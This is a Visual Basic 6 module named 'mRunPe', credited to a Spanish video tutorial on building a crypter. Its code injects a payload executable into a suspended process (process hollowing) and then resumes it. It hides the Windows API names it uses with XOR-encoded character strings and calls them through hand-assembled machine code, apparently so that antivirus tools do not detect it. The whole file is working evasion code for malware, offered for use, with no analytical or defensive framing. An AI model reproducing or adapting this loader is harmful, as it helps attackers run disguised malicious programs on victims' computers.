Attribute VB_Name = "mRunPe"
Option Explicit

'**********************************************************
'** Video Tutorial crear un crypter en VB by DARK_J4V13R **
'** Modulo: mRunPe                                       **
'** Creditos por el modulo a: Sanlegas                   **
'** Web: Indetectables.net                               **
'**********************************************************

Private Const CONTEXT_FULL As Long = &H10007
Private Const MAX_PATH As Integer = 260
Private Const CREATE_SUSPENDED As Long = &H4
Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE As Long = &H40

Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, bvBuff As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function OutputDebugString Lib "kernel32" Alias "OutputDebugStringA" (ByVal lpOutputString As String) As Long

Public Declare Sub RtlMoveMemory Lib "kernel32" (Dest As Any, Src As Any, ByVal L As Long)
Private Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long

Private Type SECURITY_ATTRIBUTES
nLength As Long
lpSecurityDescriptor As Long
bInheritHandle As Long
End Type

Private Type STARTUPINFO
cb As Long
lpReserved As Long
lpDesktop As Long
lpTitle As Long
dwX As Long
dwY As Long
dwXSize As Long
dwYSize As Long
dwXCountChars As Long
dwYCountChars As Long
dwFillAttribute As Long
dwFlags As Long
wShowWindow As Integer
cbReserved2 As Integer
lpReserved2 As Long
hStdInput As Long
hStdOutput As Long
hStdError As Long
End Type

Private Type PROCESS_INFORMATION
hProcess As Long
hThread As Long
dwProcessId As Long
dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
ControlWord As Long
StatusWord As Long
TagWord As Long
ErrorOffset As Long
ErrorSelector As Long
DataOffset As Long
DataSelector As Long
RegisterArea(1 To 80) As Byte
Cr0NpxState As Long
End Type

Private Type CONTEXT
ContextFlags As Long

Dr0 As Long
Dr1 As Long
Dr2 As Long
Dr3 As Long
Dr6 As Long
Dr7 As Long

FloatSave As FLOATING_SAVE_AREA
SegGs As Long
SegFs As Long
SegEs As Long
SegDs As Long
Edi As Long
Esi As Long
Ebx As Long
Edx As Long
Ecx As Long
Eax As Long
Ebp As Long
Eip As Long
SegCs As Long
EFlags As Long
Esp As Long
SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
e_magic As Integer
e_cblp As Integer
e_cp As Integer
e_crlc As Integer
e_cparhdr As Integer
e_minalloc As Integer
e_maxalloc As Integer
e_ss As Integer
e_sp As Integer
e_csum As Integer
e_ip As Integer
e_cs As Integer
e_lfarlc As Integer
e_ovno As Integer
e_res(0 To 3) As Integer
e_oemid As Integer
e_oeminfo As Integer
e_res2(0 To 9) As Integer
e_lfanew As Long
End Type

Private Type IMAGE_FILE_HEADER
Machine As Integer
NumberOfSections As Integer
TimeDateStamp As Long
PointerToSymbolTable As Long
NumberOfSymbols As Long
SizeOfOptionalHeader As Integer
characteristics As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
VirtualAddress As Long
Size As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
Magic As Integer
MajorLinkerVersion As Byte
MinorLinkerVersion As Byte
SizeOfCode As Long
SizeOfInitializedData As Long
SizeOfUnitializedData As Long
AddressOfEntryPoint As Long
BaseOfCode As Long
BaseOfData As Long
ImageBase As Long
SectionAlignment As Long
FileAlignment As Long
MajorOperatingSystemVersion As Integer
MinorOperatingSystemVersion As Integer
MajorImageVersion As Integer
MinorImageVersion As Integer
MajorSubsystemVersion As Integer
MinorSubsystemVersion As Integer
W32VersionValue As Long
SizeOfImage As Long
SizeOfHeaders As Long
CheckSum As Long
SubSystem As Integer
DllCharacteristics As Integer
SizeOfStackReserve As Long
SizeOfStackCommit As Long
SizeOfHeapReserve As Long
SizeOfHeapCommit As Long
LoaderFlags As Long
NumberOfRvaAndSizes As Long
DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
Signature As Long
FileHeader As IMAGE_FILE_HEADER
OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_SECTION_HEADER
SecName As String * 8
VirtualSize As Long
VirtualAddress As Long
SizeOfRawData As Long
PointerToRawData As Long
PointerToRelocations As Long
PointerToLinenumbers As Long
NumberOfRelocations As Integer
NumberOfLinenumbers As Integer
characteristics As Long
End Type


Public Function HRSCHXC(ByVal HZUD As String, ByVal DKKVR As String, ParamArray LXNXMDW()) As Long
Dim HKVUE As Long, BRNS(&HEC00& - 1) As Byte, EIV As Long, DFFGDKH As Long

DFFGDKH = GetProcAddress(LoadLibraryA(HZUD), DKKVR)
If DFFGDKH = 0 Then Exit Function

HKVUE = VarPtr(BRNS(0))
RtlMoveMemory ByVal HKVUE, &H59595958, &H4: HKVUE = HKVUE + 4
RtlMoveMemory ByVal HKVUE, &H5059, &H2: HKVUE = HKVUE + 2
For EIV = UBound(LXNXMDW) To 0 Step -1
RtlMoveMemory ByVal HKVUE, &H68, &H1: HKVUE = HKVUE + 1
RtlMoveMemory ByVal HKVUE, CLng(LXNXMDW(EIV)), &H4: HKVUE = HKVUE + 4
Next
RtlMoveMemory ByVal HKVUE, &HE8, &H1: HKVUE = HKVUE + 1
RtlMoveMemory ByVal HKVUE, DFFGDKH - HKVUE - 4, &H4: HKVUE = HKVUE + 4
RtlMoveMemory ByVal HKVUE, &HC3, &H1: HKVUE = HKVUE + 1
HRSCHXC = CallWindowProcA(VarPtr(BRNS(0)), 0, 0, 0, 0)
End Function

Public Function XZOWR(ByVal OQKCBQ As String, ByVal PLYIT As String) As String
Dim DEH As Long

For DEH = 1 To Len(OQKCBQ)
XZOWR = XZOWR & Chr(Asc(Mid(PLYIT, IIf(DEH Mod Len(PLYIT) <> 0, DEH Mod Len(PLYIT), Len(PLYIT)), 1)) Xor Asc(Mid(OQKCBQ, DEH, 1)))
Next DEH
End Function

Public Sub RunPe(ByVal OUVYP As String, ByRef RGUJ() As Byte, GICAS As String)
Dim MVS As Long, JFKU As IMAGE_DOS_HEADER, WWXUC As IMAGE_NT_HEADERS, GCNZHY As IMAGE_SECTION_HEADER
Dim WVANYJR As STARTUPINFO, TZPTYR As PROCESS_INFORMATION, MUVCIU As CONTEXT

WVANYJR.cb = Len(WVANYJR)
RtlMoveMemory JFKU, RGUJ(0), 64
RtlMoveMemory WWXUC, RGUJ(JFKU.e_lfanew), 248

CreateProcessA OUVYP, " " & GICAS, 0, 0, False, CREATE_SUSPENDED, 0, 0, WVANYJR, TZPTYR
HRSCHXC XZOWR(Chr(54) & Chr(46) & Chr(34) & Chr(57) & Chr(45), "XZFUAEXSBBHOBPJCLDKIUBCFVXMBOMNIGYONJEGR"), XZOWR(Chr(22) & Chr(46) & Chr(19) & Chr(59) & Chr(44) & Chr(36) & Chr(40) & Chr(5) & Chr(43) & Chr(39) & Chr(63) & Chr(0) & Chr(36) & Chr(3) & Chr(47) & Chr(32) & Chr(56) & Chr(45) & Chr(36) & Chr(39), "XZFUAEXSBBHOBPJCLDKIUBCFVXMBOMNIGYONJEGR"), TZPTYR.hProcess, WWXUC.OptionalHeader.ImageBase
HRSCHXC XZOWR(Chr(51) & Chr(63) & Chr(52) & Chr(59) & Chr(36) & Chr(41) & Chr(107) & Chr(97), "XZFUAEXSBBHOBPJCLDKIUBCFVXMBOMNIGYONJEGR"), XZOWR(Chr(14) & Chr(51) & Chr(52) & Chr(33) & Chr(52) & Chr(36) & Chr(52) & Chr(18) & Chr(46) & Chr(46) & Chr(39) & Chr(44) & Chr(7) & Chr(40), "XZFUAEXSBBHOBPJCLDKIUBCFVXMBOMNIGYONJEGR"), TZPTYR.hProcess, WWXUC.OptionalHeader.ImageBase, WWXUC.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
WriteProcessMemory TZPTYR.hProcess, ByVal WWXUC.OptionalHeader.ImageBase, RGUJ(0), WWXUC.OptionalHeader.SizeOfHeaders, 0

For MVS = 0 To WWXUC.FileHeader.NumberOfSections - 1
RtlMoveMemory GCNZHY, RGUJ(JFKU.e_lfanew + 248 + 40 * MVS), Len(GCNZHY)
WriteProcessMemory TZPTYR.hProcess, ByVal WWXUC.OptionalHeader.ImageBase + GCNZHY.VirtualAddress, RGUJ(GCNZHY.PointerToRawData), GCNZHY.SizeOfRawData, 0
Next MVS

MUVCIU.ContextFlags = CONTEXT_FULL
HRSCHXC XZOWR(Chr(51) & Chr(63) & Chr(52) & Chr(59) & Chr(36) & Chr(41) & Chr(107) & Chr(97), "XZFUAEXSBBHOBPJCLDKIUBCFVXMBOMNIGYONJEGR"), XZOWR(Chr(31) & Chr(63) & Chr(50) & Chr(1) & Chr(41) & Chr(55) & Chr(61) & Chr(50) & Chr(38) & Chr(1) & Chr(39) & Chr(33) & Chr(54) & Chr(53) & Chr(50) & Chr(55), "XZFUAEXSBBHOBPJCLDKIUBCFVXMBOMNIGYONJEGR"), TZPTYR.hThread, VarPtr(MUVCIU)
WriteProcessMemory TZPTYR.hProcess, ByVal MUVCIU.Ebx + 8, WWXUC.OptionalHeader.ImageBase, 4, 0
MUVCIU.Eax = WWXUC.OptionalHeader.ImageBase + WWXUC.OptionalHeader.AddressOfEntryPoint
HRSCHXC XZOWR(Chr(51) & Chr(63) & Chr(52) & Chr(59) & Chr(36) & Chr(41) & Chr(107) & Chr(97), "XZFUAEXSBBHOBPJCLDKIUBCFVXMBOMNIGYONJEGR"), XZOWR(Chr(11) & Chr(63) & Chr(50) & Chr(1) & Chr(41) & Chr(55) & Chr(61) & Chr(50) & Chr(38) & Chr(1) & Chr(39) & Chr(33) & Chr(54) & Chr(53) & Chr(50) & Chr(55), "XZFUAEXSBBHOBPJCLDKIUBCFVXMBOMNIGYONJEGR"), TZPTYR.hThread, VarPtr(MUVCIU)
HRSCHXC XZOWR(Chr(51) & Chr(63) & Chr(52) & Chr(59) & Chr(36) & Chr(41) & Chr(107) & Chr(97), "XZFUAEXSBBHOBPJCLDKIUBCFVXMBOMNIGYONJEGR"), XZOWR(Chr(10) & Chr(63) & Chr(53) & Chr(32) & Chr(44) & Chr(32) & Chr(12) & Chr(59) & Chr(48) & Chr(39) & Chr(41) & Chr(43), "XZFUAEXSBBHOBPJCLDKIUBCFVXMBOMNIGYONJEGR"), TZPTYR.hThread
End Sub

